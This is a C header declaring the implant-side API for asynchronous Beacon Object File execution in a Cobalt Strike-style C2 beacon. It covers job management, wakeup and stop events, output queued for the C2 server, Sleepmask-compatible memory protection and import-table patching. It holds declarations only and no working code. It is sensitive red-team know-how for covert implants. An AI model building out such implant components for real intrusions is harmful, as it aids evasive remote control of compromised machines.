/**
 * @file async_bof_implant.h
 * @brief Async BOF Implant-Side Core Implementation
 * @author Offensive Security Researcher
 * @date 2025
 *
 * This header defines the implant-side mechanisms for asynchronous BOF execution.
 * It provides:
 * 1. BeaconWakeup() - Event mechanism to wake up sleeping beacon
 * 2. BeaconGetStopJobEvent() - Graceful shutdown signal for async BOFs
 * 3. Thread-safe communication channels
 * 4. Memory protection during Sleepmask operations
 */

#ifndef ASYNC_BOF_IMPLANT_H
#define ASYNC_BOF_IMPLANT_H

#include <windows.h>
#include <stdarg.h>

// ============================================================================
// FORWARD DECLARATIONS
// ============================================================================

// Forward declaration for BOF datap parser structure
// This is the standard Cobalt Strike BOF argument parser type
typedef struct _datap {
    char* original;         // Original buffer
    char* buffer;           // Current position in buffer
    int  length;            // Remaining length
    int  size;              // Total size
    BOOL malloced;          // Whether buffer was dynamically allocated
} datap, *pdatap;

// ============================================================================
// CONSTANTS & MACROS
// ============================================================================

#define MAX_ASYNC_JOBS          16              // Maximum concurrent async BOFs
#define MAX_OUTPUT_BUFFER_SIZE  (1024 * 1024)   // 1MB output buffer per job
#define WAKEUP_EVENT_NAME       "Global\\BeaconWakeupEvent"
#define STOP_EVENT_TEMPLATE     "Global\\AsyncBOF_Stop_%p"

// BOF Execution States
typedef enum _BOF_JOB_STATE {
    BOF_JOB_IDLE = 0,
    BOF_JOB_RUNNING,
    BOF_JOB_PENDING_OUTPUT,
    BOF_JOB_STOPPING,
    BOF_JOB_COMPLETED,
    BOF_JOB_FAILED
} BOF_JOB_STATE;

// ============================================================================
// DATA STRUCTURES
// ============================================================================

/**
 * @brief Async-safe proxy function table
 *
 * When main beacon module is encrypted by Sleepmask, async threads
 * cannot directly call Beacon APIs. This table holds alternative
 * implementations that remain accessible.
 */
typedef struct _ASYNC_BOF_FUNCTION_TABLE {
    // Output functions (async-safe versions)
    void (*AsyncBeaconPrintf)(int type, const char* fmt, ...);
    void (*AsyncBeaconOutput)(int type, const void* data, size_t len);

    // Utility functions
    void* (*AsyncBeaconAlloc)(size_t size);
    void  (*AsyncBeaconFree)(void* ptr);

    // Signal functions
    BOOL  (*AsyncBeaconWakeup)(void);
    HANDLE (*AsyncBeaconGetStopJobEvent)(void);

    // Parsing functions (cached data)
    void* (*AsyncBeaconGetValue)(datap* parser, int type);
    void* (*AsyncBeaconGetParsedData)(datap* parser);

} ASYNC_BOF_FUNCTION_TABLE;

/**
 * @brief Represents a single async BOF job
 */
typedef struct _ASYNC_BOF_JOB {
    // Thread management
    HANDLE              hThread;            // Worker thread handle
    DWORD               dwThreadId;         // Thread ID
    HANDLE              hStopEvent;         // Signal to request stop
    HANDLE              hWakeupEvent;       // Signal to wake main beacon

    // Job metadata
    DWORD               dwJobId;            // Unique job identifier
    BOF_JOB_STATE       State;              // Current execution state
    DWORD               dwStartTime;        // Tick count when started
    DWORD               dwLastHeartbeat;    // Last activity timestamp

    // BOF code and data
    LPVOID              pBOFCode;           // Pointer to BOF entry point
    SIZE_T              nCodeSize;          // Size of BOF code
    LPVOID              pBOFData;           // Serialized arguments
    SIZE_T              nDataSize;          // Arguments size

    // Output buffer (protected by critical section)
    CRITICAL_SECTION    csOutput;           // Sync access to output buffer
    LPBYTE              pOutputBuffer;      // Accumulated output
    SIZE_T              nOutputSize;        // Current output size
    SIZE_T              nOutputCapacity;    // Buffer capacity

    // Memory protection flags
    BOOL                bMemoryProtected;   // Whether memory is protected
    DWORD               dwOriginalProtect;  // Original page protections

} ASYNC_BOF_JOB, *PASYNC_BOF_JOB;

/**
 * @brief Global async BOF manager state
 */
typedef struct _ASYNC_BOF_MANAGER {
    // Job tracking
    ASYNC_BOF_JOB           Jobs[MAX_ASYNC_JOBS];
    CRITICAL_SECTION        csJobList;       // Protects job array access
    DWORD                   dwNextJobId;     // Counter for unique IDs

    // Global events
    HANDLE                  hGlobalWakeup;   // Master wakeup event for beacon
    BOOL                    bBeaconSleeping; // Whether beacon is currently sleeping

    // Function table (initialized during beacon startup)
    ASYNC_BOF_FUNCTION_TABLE FunctionTable;

    // Memory protection regions
    LPVOID                  pProtectedRegions[MAX_ASYNC_JOBS];
    DWORD                   dwProtectedRegionCount;

} ASYNC_BOF_MANAGER, *PASYNC_BOF_MANAGER;

// Global instance (accessed via accessor function)
extern ASYNC_BOF_MANAGER g_AsyncBOFManager;

// ============================================================================
// INTERNAL UTILITY FUNCTIONS
// ============================================================================

/**
 * @brief Get the current thread's job ID from thread-local storage
 * @return Job ID or 0 if not found
 *
 * This is used internally by proxy functions to determine which job
 * is making the call.
 */
DWORD GetCurrentJobId(void);

// ============================================================================
// CORE API: BeaconWakeup Implementation
// ============================================================================

/**
 * @brief Initialize the wakeup event system
 * @return TRUE on success, FALSE on failure
 *
 * Called during beacon initialization to set up the global wakeup event.
 * This event is signaled when an async BOF has important data to report.
 */
BOOL AsyncBOF_InitializeWakeupEvent(void);

/**
 * @brief Wake up the sleeping beacon from async thread
 * @return TRUE if beacon was woken up, FALSE on error
 *
 * This is the async-safe version of BeaconWakeup.
 * When called from a background BOF thread:
 * 1. Checks if beacon is currently sleeping
 * 2. Sets the global wakeup event
 * 3. Beacon's main thread wakes from Sleep() and processes pending output
 *
 * Implementation notes:
 * - Uses manual reset event for immediate wakeup
 * - Beacon automatically resets event when resuming activity
 * - Safe to call multiple times
 * - Thread-safe without locks (event is atomic)
 */
BOOL AsyncBOF_BeaconWakeup(void);

/**
 * @brief Wait for wakeup event in beacon main loop
 * @param dwTimeout Timeout in milliseconds (usually beacon's sleep time)
 * @return WAIT_OBJECT_0 if woken up, WAIT_TIMEOUT on timeout, or error code
 *
 * Called by beacon's main thread when it wants to sleep.
 * Replaces the standard Sleep() call in beacon's command loop.
 *
 * Usage in beacon:
 *   DWORD dwResult = AsyncBOF_WaitForWakeup(dwSleepTime);
 *   if (dwResult == WAIT_OBJECT_0) {
 *       // Woken up by async BOF, check for pending output
 *       AsyncBOF_ProcessAllOutput();
 *   }
 */
DWORD AsyncBOF_WaitForWakeup(DWORD dwTimeout);

// ============================================================================
// CORE API: BeaconGetStopJobEvent Implementation
// ============================================================================

/**
 * @brief Get the stop event handle for a specific job
 * @param dwJobId The job ID to get stop event for
 * @return Handle to stop event, or NULL if job not found
 *
 * This function implements BeaconGetStopJobEvent() semantics.
 * The returned handle can be used with WaitForSingleObject() in BOF code.
 *
 * Usage in BOF:
 *   HANDLE hStop = BeaconGetStopJobEvent();
 *   while (WaitForSingleObject(hStop, 1000) != WAIT_OBJECT_0) {
 *       // Do work, checking stop signal every second
 *   }
 */
HANDLE AsyncBOF_GetStopJobEvent(DWORD dwJobId);

/**
 * @brief Signal all async BOFs to stop gracefully
 * @return Number of jobs signaled
 *
 * Called by beacon when it needs to shut down (e.g., before exiting).
 * Sets the stop event for all running jobs.
 */
DWORD AsyncBOF_StopAllJobs(void);

/**
 * @brief Wait for a specific job to complete
 * @param dwJobId Job ID to wait for
 * @param dwTimeout Timeout in milliseconds (INFINITE for no timeout)
 * @return TRUE if job completed, FALSE if timeout or error
 */
BOOL AsyncBOF_WaitForJobCompletion(DWORD dwJobId, DWORD dwTimeout);

// ============================================================================
// JOB MANAGEMENT FUNCTIONS
// ============================================================================

/**
 * @brief Initialize the async BOF manager
 * @return TRUE on success, FALSE on failure
 *
 * Must be called once during beacon startup.
 */
BOOL AsyncBOF_InitializeManager(void);

/**
 * @brief Cleanup and destroy the async BOF manager
 * @return TRUE on success
 *
 * Called during beacon shutdown.
 * Ensures all jobs are stopped and resources freed.
 */
BOOL AsyncBOF_DestroyManager(void);

/**
 * @brief Start a new async BOF job
 * @param pBOFEntry Pointer to BOF entry point function
 * @param pArgs Serialized arguments buffer
 * @param nArgsSize Size of arguments buffer
 * @param nCodeSize Size of BOF code (for memory tracking)
 * @param pdwJobId Receives the new job ID
 * @return TRUE if job started successfully, FALSE on failure
 *
 * This is the main function called by beacon to launch an async BOF.
 */
BOOL AsyncBOF_StartJob(
    LPVOID pBOFEntry,
    LPVOID pArgs,
    SIZE_T nArgsSize,
    SIZE_T nCodeSize,
    PDWORD pdwJobId
);

/**
 * @brief Stop and cleanup a specific job
 * @param dwJobId Job ID to stop
 * @param bForce If TRUE, terminate thread (use only as last resort)
 * @return TRUE if job stopped successfully
 */
BOOL AsyncBOF_StopJob(DWORD dwJobId, BOOL bForce);

/**
 * @brief Get output from a completed job
 * @param dwJobId Job ID to get output from
 * @param ppOutput Receives pointer to output buffer
 * @param pnOutputSize Receives output size
 * @return TRUE if output retrieved, FALSE if no output available
 *
 * Caller is responsible for freeing the output buffer.
 */
BOOL AsyncBOF_GetJobOutput(DWORD dwJobId, LPVOID* ppOutput, PSIZE_T pnOutputSize);

/**
 * @brief Check if any job has pending output
 * @return TRUE if there's pending output to send to C2
 */
BOOL AsyncBOF_HasPendingOutput(void);

/**
 * @brief Process and send all pending output to C2
 * @return Number of jobs processed
 */
DWORD AsyncBOF_ProcessAllOutput(void);

// ============================================================================
// MEMORY PROTECTION FUNCTIONS (SLEEPMASK COMPATIBILITY)
// ============================================================================

/**
 * @brief Protect async BOF memory regions before Sleepmask activates
 * @return TRUE if protection applied successfully
 *
 * Called by beacon RIGHT BEFORE it encrypts its own memory.
 * This function:
 * 1. Marks all BOF code regions as read-only
 * 2. Flushes instruction cache
 * 3. Records protected regions for later restoration
 *
 * This prevents Sleepmask from accidentally encrypting BOF memory.
 */
BOOL AsyncBOF_ProtectMemoryForSleep(void);

/**
 * @brief Restore async BOF memory protections after Sleepmask deactivates
 * @return TRUE if protection restored successfully
 *
 * Called by beacon RIGHT AFTER it decrypts its memory.
 * Restores memory protections to allow future BOF loading/modification.
 */
BOOL AsyncBOF_RestoreMemoryAfterSleep(void);

/**
 * @brief Add a memory region to the protection list
 * @param pAddress Starting address of region
 * @param nSize Size of region in bytes
 * @return TRUE if region added successfully
 *
 * Called when a new BOF is loaded.
 */
BOOL AsyncBOF_AddProtectedRegion(LPVOID pAddress, SIZE_T nSize);

// ============================================================================
// INTERNAL: WORKER THREAD PROCEDURE
// ============================================================================

/**
 * @brief Worker thread procedure for async BOF execution
 * @param pContext Pointer to ASYNC_BOF_JOB structure
 * @return Exit code (0 for success, non-zero for error)
 *
 * This function:
 * 1. Sets up the async BOF environment
 * 2. Calls the BOF entry point
 * 3. Captures all output via proxy functions
 * 4. Handles stop signals gracefully
 * 5. Cleans up resources on exit
 */
DWORD WINAPI AsyncBOF_WorkerThread(LPVOID pContext);

// ============================================================================
// PROXY FUNCTIONS (ASYNC-SAFE BEACON API REPLACEMENTS)
// ============================================================================

/**
 * @brief Async-safe version of BeaconPrintf
 * @param type Output type (OUTPUT_OT, OUTPUT_ERROR, etc.)
 * @param fmt Printf-style format string
 * @param ... Variable arguments
 *
 * Instead of calling main beacon (which may be encrypted),
 * this function queues output to the job's output buffer.
 */
void AsyncBOF_ProxyBeaconPrintf(int type, const char* fmt, ...);

/**
 * @brief Async-safe version of BeaconOutput
 * @param type Output type
 * @param data Data buffer
 * @param len Data length
 *
 * Queues raw output to job's buffer instead of sending immediately.
 */
void AsyncBOF_ProxyBeaconOutput(int type, const void* data, size_t len);

/**
 * @brief Async-safe memory allocator
 * @param size Number of bytes to allocate
 * @return Pointer to allocated memory, or NULL on failure
 */
void* AsyncBOF_ProxyBeaconAlloc(size_t size);

/**
 * @brief Async-safe memory deallocator
 * @param ptr Pointer to memory to free (must be allocated by ProxyBeaconAlloc)
 */
void AsyncBOF_ProxyBeaconFree(void* ptr);

// ============================================================================
// IAT REDIRECTION FUNCTIONS
// ============================================================================

/**
 * @brief Patch BOF import table to use async-safe proxy functions
 * @param pBOFEntry BOF entry point address
 * @param pFunctionTable Pointer to async function table
 * @return TRUE if patching successful
 *
 * This function:
 * 1. Parses BOF's COFF format to locate symbol table
 * 2. Finds references to Beacon* functions
 * 3. Replaces them with AsyncBOF_Proxy* alternatives
 * 4. Ensures BOF can safely run while beacon is encrypted
 */
BOOL AsyncBOF_PatchImports(LPVOID pBOFEntry, ASYNC_BOF_FUNCTION_TABLE* pFunctionTable);

/**
 * @brief Initialize the async function table with real implementations
 * @param pTable Pointer to function table structure
 *
 * Populates the function table with pointers to our proxy implementations.
 */
void AsyncBOF_InitializeFunctionTable(ASYNC_BOF_FUNCTION_TABLE* pTable);

// ============================================================================
// UTILITY MACROS
// ============================================================================

// Convenience macros for BOF code
#define BeaconWakeup()              AsyncBOF_BeaconWakeup()
#define BeaconGetStopJobEvent()     AsyncBOF_GetStopJobEvent(GetCurrentJobId())

// Debug macros (remove in production)
#ifdef DEBUG_ASYNC_BOF
#define ASYNC_BOF_DEBUG(fmt, ...) AsyncBOF_ProxyBeaconPrintf(0, "[DEBUG] " fmt, ##__VA_ARGS__)
#else
#define ASYNC_BOF_DEBUG(fmt, ...) /* nothing */
#endif

#endif // ASYNC_BOF_IMPLANT_H
